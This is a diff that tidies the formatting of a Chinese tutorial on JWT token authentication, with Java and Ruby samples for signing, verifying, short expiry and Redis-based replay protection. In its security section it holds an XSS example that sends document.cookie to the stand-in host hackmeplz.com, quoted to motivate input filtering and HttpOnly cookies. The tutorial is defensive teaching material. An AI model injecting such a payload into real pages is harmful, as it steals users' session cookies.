@@ -74,8 +74,9 @@ JSON Web Token（JWT）是一个非常轻巧的规范。这个规范允许我们
 * aud: 接收该JWT的一方，是否使用是可选的；
 * exp\(expires\): 什么时候过期，这里是一个Unix时间戳，是否使用是可选的；
 * iat\(issued at\): 在什么时候签发的\(UNIX时间\)，是否使用是可选的；
- 
+
   其他还有：
+
 * nbf \(Not Before\)：如果当前时间在nbf里的时间之前，则Token不被接受；一般都会留一些余地，比如几分钟；，是否使用是可选的；
 
 将上面的JSON对象进行\[base64编码\]可以得到下面的字符串。这个字符串我们将它称作JWT的Payload（载荷）。
@@ -179,35 +180,35 @@ import javax.xml.bind.DatatypeConverter;
 import java.security.Key;
 import io.jsonwebtoken.*;
 import java.util.Date;    
- 
+
 //Sample method to construct a JWT
- 
+
 private String createJWT(String id, String issuer, String subject, long ttlMillis) {
- 
+
 //The JWT signature algorithm we will be using to sign the token
 SignatureAlgorithm signatureAlgorithm = SignatureAlgorithm.HS256;
- 
+
 long nowMillis = System.currentTimeMillis();
 Date now = new Date(nowMillis);
- 
+
 //We will sign our JWT with our ApiKey secret
 byte[] apiKeySecretBytes = DatatypeConverter.parseBase64Binary(apiKey.getSecret());
 Key signingKey = new SecretKeySpec(apiKeySecretBytes, signatureAlgorithm.getJcaName());
- 
+
   //Let's set the JWT Claims
 JwtBuilder builder = Jwts.builder().setId(id)
                                 .setIssuedAt(now)
                                 .setSubject(subject)
                                 .setIssuer(issuer)
                                 .signWith(signatureAlgorithm, signingKey);
- 
+
 //if it has been specified, let's add the expiration
 if (ttlMillis >= 0) {
     long expMillis = nowMillis + ttlMillis;
     Date exp = new Date(expMillis);
     builder.setExpiration(exp);
 }
- 
+
 //Builds the JWT and serializes it to a compact, URL-safe string
 return builder.compact();
 }
@@ -216,61 +217,21 @@ return builder.compact();
 **解码和验证Token码**
 
 ```
-import
- javax.xml.bind.DatatypeConverter;
-
-import
- io.jsonwebtoken.Jwts;
-
-import
- io.jsonwebtoken.Claims;
+import javax.xml.bind.DatatypeConverter;
+import io.jsonwebtoken.Jwts;
+import io.jsonwebtoken.Claims;
  
-
 //Sample method to validate and read the JWT
-private
- void parseJWT(
-String
- jwt) {
-
+private void parseJWT(String jwt) {
 //This line will throw an exception if it is not a signed JWS (as expected)
-Claims
- claims = 
-Jwts
-.parser()        
-   .setSigningKey(
-DatatypeConverter
-.parseBase64Binary(apiKey.getSecret()))
+Claims claims = Jwts.parser()        
+   .setSigningKey(DatatypeConverter.parseBase64Binary(apiKey.getSecret()))
    .parseClaimsJws(jwt).getBody();
-
-System
-.out.
-println
-(
-"ID: "
- + claims.getId());
-
-System
-.out.
-println
-(
-"Subject: "
- + claims.getSubject());
-
-System
-.out.
-println
-(
-"Issuer: "
- + claims.getIssuer());
-
-System
-.out.
-println
-(
-"Expiration: "
- + claims.getExpiration());
+System.out.println("ID: " + claims.getId());
+System.out.println("Subject: " + claims.getSubject());
+System.out.println("Issuer: " + claims.getIssuer());
+System.out.println("Expiration: " + claims.getExpiration());
 }
-
 ```
 
 ## 基于JWT的Token认证的安全问题 {#基于jwt的token认证的安全问题}
@@ -284,79 +245,42 @@ println
 浏览器可以做很多事情，这也给浏览器端的安全带来很多隐患，最常见的如：XSS攻击：跨站脚本攻击\(Cross Site Scripting\)；如果有个页面的输入框中允许输入任何信息，且没有做防范措施，如果我们输入下面这段代码：
 
 ```
-<
-img src=
-"x"
-/
->
- a.src='https:/
-/hackmeplz.com/yourCookies.png/
-?cookies=’
-+
-document
-.cookie;
-return
- a}())
-"
+<img src="x" /> a.src='https://hackmeplz.com/yourCookies.png/?cookies=’
++document.cookie;return a}())"
 ```
 
 这段代码会盗取你域中的所有cookie信息，并发送到 hackmeplz.com；那么我们如何来防范这种攻击呢？
 
 * **XSS攻击代码过滤**
- 
+
   移除任何会导致浏览器做非预期执行的代码，这个可以采用一些库来实现（如：js下的js-xss，JAVA下的XSS HTMLFilter，PHP下的TWIG）；如果你是将用户提交的字符串存储到数据库的话（也针对SQL注入攻击），你需要在前端和服务端分别做过滤；
+
 * **采用HTTP-Only Cookies**
- 
+
   通过设置Cookie的参数： HttpOnly; Secure 来防止通过JavaScript 来访问Cookie；
- 
+
   如何在Java中设置cookie是HttpOnly呢？
- 
+
   Servlet 2.5 API 不支持 cookie设置HttpOnly
- 
+
   [http://docs.oracle.com/cd/E17802\_01/products/products/servlet/2.5/docs/servlet-2\_5-mr2/](http://docs.oracle.com/cd/E17802_01/products/products/servlet/2.5/docs/servlet-2_5-mr2/)
- 
+
   建议升级Tomcat7.0，它已经实现了Servlet3.0
- 
+
   [http://tomcat.apache.org/tomcat-7.0-doc/servletapi/javax/servlet/http/Cookie.html](http://tomcat.apache.org/tomcat-7.0-doc/servletapi/javax/servlet/http/Cookie.html)
- 
+
   或者通过这样来设置：
 
 ```
 //设置cookie
-response.addHeader("
-Set
--Cookie
-", "
-uid=
-112
-; Path=/; HttpOnly");
+response.addHeader("Set-Cookie", "uid=112; Path=/; HttpOnly");
 
 //设置多个cookie
-response.addHeader("
-Set
--Cookie
-", "
-uid=
-112
-; Path=/; HttpOnly");
-response.addHeader("
-Set
--Cookie
-", "
-timeout
-=
-30
-; Path=/test; HttpOnly");
+response.addHeader("Set-Cookie", "uid=112; Path=/; HttpOnly");
+response.addHeader("Set-Cookie", "timeout=30; Path=/test; HttpOnly");
 
 //设置https的cookie
-response.addHeader("
-Set
--Cookie
-", "
-uid=
-112
-; Path=/; Secure; HttpOnly");
-
+response.addHeader("Set-Cookie", "uid=112; Path=/; Secure; HttpOnly");
 ```
 
 在实际使用中，我们可以使FireCookie查看我们设置的Cookie 是否是HttpOnly；
@@ -375,90 +299,39 @@ uid=
 
 ```
 auth_header = JWT.encode({
-
-  user_id:
-123
-,
-
-  iat:
- Time.now.to_i,      
-# 指定token发布时间
-  exp:
- Time.now.to_i + 
-2
-# 指定token过期时间为2秒后，2秒时间足够一次HTTP请求，同时在一定程度确保上一次token过期，减少replay attack的概率；
-
-}, 
-"
-<
-my shared secret
->
-"
-)
-RestClient.get(
-"http://api.example.com/"
-, authorization: auth_header)
-
+  user_id: 123,
+  iat: Time.now.to_i,      # 指定token发布时间
+  exp: Time.now.to_i + 2   # 指定token过期时间为2秒后，2秒时间足够一次HTTP请求，同时在一定程度确保上一次token过期，减少replay attack的概率；
+}, "<my shared secret>")
+RestClient.get("http://api.example.com/", authorization: auth_header)
 ```
 
 **服务端**
 
 ```
-class
-ApiController
-<
- ActionController::Base
-attr_reader
-:current_user
+class ApiController < ActionController::Base
+  attr_reader :current_user
+  before_action :set_current_user_from_jwt_token
 
-  before_action 
-:set_current_user_from_jwt_token
-def
-set_current_user_from_jwt_token
-# Step 1:解码JWT，并获取User ID，这个时候不对Token签名进行检查
-# the signature. Note JWT tokens are *not* encrypted, but signed.
+  def set_current_user_from_jwt_token
+    # Step 1:解码JWT，并获取User ID，这个时候不对Token签名进行检查
+    # the signature. Note JWT tokens are *not* encrypted, but signed.
+    payload = JWT.decode(request.authorization, nil, false)
 
-    payload = JWT.decode(request.authorization, 
-nil
-, 
-false
-)
-
+    # Step 2: 检查该用户是否存在于数据库
+    @current_user = User.find(payload['user_id'])
     
-# Step 2: 检查该用户是否存在于数据库
-
-    @current_user = User.find(payload[
-'user_id'
-])
-    
-    
-# Step 3: 检查Token签名是否正确.
-
+    # Step 3: 检查Token签名是否正确.
     JWT.decode(request.authorization, current_user.api_secret)
     
-    
-# Step 4: 检查 "iat" 和"exp" 以确保这个Token是在2秒内创建的.
-
+    # Step 4: 检查 "iat" 和"exp" 以确保这个Token是在2秒内创建的.
     now = Time.now.to_i
-    
-if
- payload[
-'iat'
-] 
->
- now || payload[
-'exp'
-] 
-<
- now
-      
-# 如果过期则返回401
-end
-rescue
-JWT:
-:DecodeError
-# 返回 401
-end
+    if payload['iat'] > now || payload['exp'] < now
+      # 如果过期则返回401
+    end
+  rescue JWT::DecodeError
+    # 返回 401
+  end
 end
 ```
 
@@ -467,108 +340,41 @@ end
 
 ```
 auth_header = JWT.encode({
-
-  user_id:
-123
-,
-
-  jti:
- rand(
-2
-<
-<
-64
-).to_s,  
-# 通过jti确保一个token只使用一次，防止replace attack
-  iat:
- Time.now.to_i,       
-# 指定token发布时间.
-  exp:
- Time.now.to_i + 
-2
-# 指定token过期时间为2秒后
-
-}, 
-"
-<
-my shared secret
->
-"
-)
-RestClient.get(
-"http://api.example.com/"
-, authorization: auth_header)
+  user_id: 123,
+  jti: rand(2 << 64).to_s,  # 通过jti确保一个token只使用一次，防止replace attack
+  iat: Time.now.to_i,       # 指定token发布时间.
+  exp: Time.now.to_i + 2    # 指定token过期时间为2秒后
+}, "<my shared secret>")
+RestClient.get("http://api.example.com/", authorization: auth_header)
 ```
 
 **服务端**
 
 ```
-def
-set_current_user_from_jwt_token
-# 前面的步骤参考上面
-
-  payload = JWT.decode(request.authorization, 
-nil
-, 
-false
-)
-  @current_user = User.find(payload[
-'user_id'
-])
+def set_current_user_from_jwt_token
+  # 前面的步骤参考上面
+  payload = JWT.decode(request.authorization, nil, false)
+  @current_user = User.find(payload['user_id'])
   JWT.decode(request.authorization, current_user.api_secret)
   now = Time.now.to_i
+  if payload['iat'] > now || payload['exp'] < now
+    # 返回401
+  end
   
-if
- payload[
-'iat'
-] 
->
- now || payload[
-'exp'
-] 
-<
- now
-    
-# 返回401
-end
-# 下面将检查确保这个JWT之前没有被使用过
-# 使用Redis的原子操作
-# The redis 的键: 
-<
-user id
->
-:
-<
-one-time use token
->
-
-  key = 
-"
-#{payload[
-'user_id'
-]}
-:
-#{payload[
-'jti'
-]}
-"
-# 看键值是否在redis中已经存在. 如果不存在则返回nil. 如果存在则返回“1”. .
-if
- redis.getset(key, 
-"1"
-)
-    
-# 返回401
-# 
-end
-# 进行键值过期检查
-
-  redis.expireat(key, payload[
-'exp'
-] + 
-2
-)
-
+  # 下面将检查确保这个JWT之前没有被使用过
+  # 使用Redis的原子操作
+  
+  # The redis 的键: <user id>:<one-time use token>
+  key = "#{payload['user_id']}:#{payload['jti']}"
+  
+  # 看键值是否在redis中已经存在. 如果不存在则返回nil. 如果存在则返回“1”. .
+  if redis.getset(key, "1")
+    # 返回401
+    # 
+  end
+  
+  # 进行键值过期检查
+  redis.expireat(key, payload['exp'] + 2)
 end
 ```
 
